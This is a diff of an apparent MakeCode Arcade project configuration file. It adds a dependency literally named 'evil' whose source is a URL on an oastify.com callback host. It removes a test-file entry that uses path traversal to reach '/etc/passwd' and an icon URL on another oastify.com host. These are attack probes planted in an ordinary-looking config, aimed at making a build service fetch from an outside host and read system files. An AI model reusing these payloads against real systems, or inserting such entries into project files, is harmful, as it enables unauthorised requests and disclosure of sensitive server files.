@@ -3,15 +3,12 @@
   "version": "1.0.3",
   "description": "",
   "dependencies": {
-    "device": "*"
+    "device": "*",
+    "evil": "https://064h8spnn9qim589y1zud2t7ryxplgf44.oastify.com/pxt.json"
   },
   "files": [
     "main.ts"
   ],
-  "testFiles": [
-    "../../../../../etc/passwd"
-  ],
-  "icon": "https://7v3oxzeucgfpbcxgn8o129ieg5mwan3bs.oastify.com/icon.png",
   "targetVersions": {
     "target": "1.3.44",
     "targetId": "arcade"
